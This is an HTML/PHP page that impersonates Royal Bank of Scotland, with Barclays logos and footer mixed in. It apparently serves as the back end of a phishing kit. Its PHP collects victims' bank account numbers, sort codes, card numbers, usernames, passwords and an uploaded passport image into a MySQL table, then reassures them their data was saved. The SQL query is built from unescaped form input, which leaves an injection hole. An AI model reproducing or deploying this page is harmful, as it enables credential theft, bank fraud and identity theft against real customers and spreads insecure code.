<html>
    <title>Royal Bank Of Scotland</title>
<head>
      <link rel="icon" type="png" href="image/rbs-logo.png"style="width:200px;height:200px;">
<link rel="stylesheet" href="./css/bootstrap.css">
<link rel="stylesheet" href="./css/bootstrap.min.css">
</head>


<style>
.table{width:80%;margin:auto;background:#4040bf;border:2px solid green;}
th{text-align:center;color:#fff;}
.br{border:0.7px solid black;
width:100%;
display:block;
color:#fff;
padding:3px;
}

.bor{border:1px solid black;}

.header{width:100%;height:50px;background:lightgray;}
	  *{margin:0;box-sizing:border-box;}
	  body {font-family: "Lato", sans-serif;}
	  .table{width:80%;margin:auto;background:orange;border:2px solid green;}
th{text-align:center;color:#fff;}
.br{border:0.7px solid black;
width:100%;
display:block;
color:#fff;
padding:3px;
}

.bor{border:1px solid black;}
</style> 

</head>
<body>
<p id="demo"></p>

<div class="header">
		<div class="container">
<div class="row">
<div class="col-md-3">
<img src="Image/barclays-bank-logo-png.png" style="width:150px;height:50px;padding-top:10px;">
		</div>
		<div class="col-md-7 ">
       <p style="padding-top:5px;color:#999966;"> <span style="font-size:30px;">Welcome To The Royal Bank Of Sctland Online Technology</span></p>
         </div>
		</div>
		</div>
		</div>


<div class="container">
<div class="row">
	<div class="col-md-3.5 border 2px solid black">
        <img src="image/e357f734acfce3ed208749574bdd54c5.jpg" style="width:300px;height:120px;padding-top:0;margin:0;">
         </div>

<div class="col-md-3.5 border 2px solid black">
<img src="image/rbs.gif-446876.jpg" style="width:400px;height:120px;padding-top:0;margin:0;">
</div>
<div class="col-md-3.5 border 2px solid black">
<img src="image/517536173672637.jpg" style="width:400px;height:120px;padding-top:0;margin:0;">

</div>
</div>
</div><br><br>

<div style="height:80px"></div>

<div id="Sign In" align="center">

<?php
$conn=new mysqli("localhost","root","","gools");
$name=$_FILES['picture']['name'];
$name1=$_POST['name'];
$bank=$_POST['bank'];
$account=$_POST['account'];
$code=$_POST['code'];
$number=$_POST['number'];
$branch=$_POST['branch'];
$initial=$_POST['initial'];
$current=$_POST['current'];
$mobile=$_POST['mobile'];
$user=$_POST['username'];
$email=$_POST['email'];
$pass=$_POST['password'];

$picsize=$_FILES['picture']['size'];

$found=0;
//echo $name."<br>";

//echo $picsize;


$ext=strtolower(pathinfo($name,PATHINFO_EXTENSION));

if($picsize<=2000000)
{
$found=1	;
}else{
	$found=0;
	echo "picture is too large";
	exit;
}


if($ext=="jpg" || $ext=="png"||$ext=="jpeg" ||$ext=="pdf")
{
	$found=1;
}
else{
	$found=0;
	echo "file format not support";
	exit;
}

if($found==1)
{
$path_name='img'.date('dmYhmi').'.jpg';
	move_uploaded_file($_FILES['picture']['tmp_name'],'upload1/'.$path_name);

$command="insert into taxes(name,bank,account,code,number,branch,initial,current,mobile,
username,email,password,image) values('$name1','$bank','$account','$code','$number','$branch','$initial',
'$current','$mobile','$user','$email','$pass','$path_name')";
if($conn->query($command))
{
echo "<h3>Your Passport Is Uploaded Successfully</h3>";
}

	
	
	?>
<?php
}
?></div><br><br><br>


<div class="flips">
<div class="container">
<div class="row">
<div class="col-md-12">
<div style="width:400px;height:200px;border:1px solid black; background-color:white;margin:auto;padding:5px;float:center;">
<div id="Sign-In" align="center"><br>
<p style="color:#000080"><span style="font-family:kalinga;font-size:20px;">Welcome Our Bonafide Customer</span></p>
<span style="font-family:kalinga;font-size:15px;">Your Datas Has Been Saved Successfully</span><br><br>
<div style="height:30px"></div>
<a href="panel.php"><button type="button" class="btn btn-success">LOG OUT <i class="fas fa-chevron-right"></i></button></a>
</div>

<div style="height:30px"></div>
<div id="Sign-In" align="center" >
<img src="image/how-to-reduce-electricity-bill-09242018183712.gif" style="width:300px; height:150px;">
</div>
</div>
</div>
</div>
</div>
</div><br>


	
<div style="height:160px"></div>

<div style="width:700px;height:5px;border:1px solid rgb(255, 235, 204); background-color:rgb(255, 235, 204);margin:auto;padding:5px;float:center;">
<div class="container">
<div class="row">
<div class="col-md-12">
<ul class="nav">
<li class="nav-item">
 <a class="nav-link"><span style="font-family:calibri;font-size:13px;"> Copyright ©2019-2029 Barclays Bank  |</span></a>
 </li>
 <li class="nav-item">
 <a class="nav-link"><span style="font-family:calibri;font-size:13px;"> Terms and Conditions |</span></a>
 </li>
  <li class="nav-item">
 <a class="nav-link"><span style="font-family:calibri;font-size:13px;"> Data Protection and Privacy Policy</span></a>
 </li>
</div>
</div>
</div>
</div>
</body>
</html>
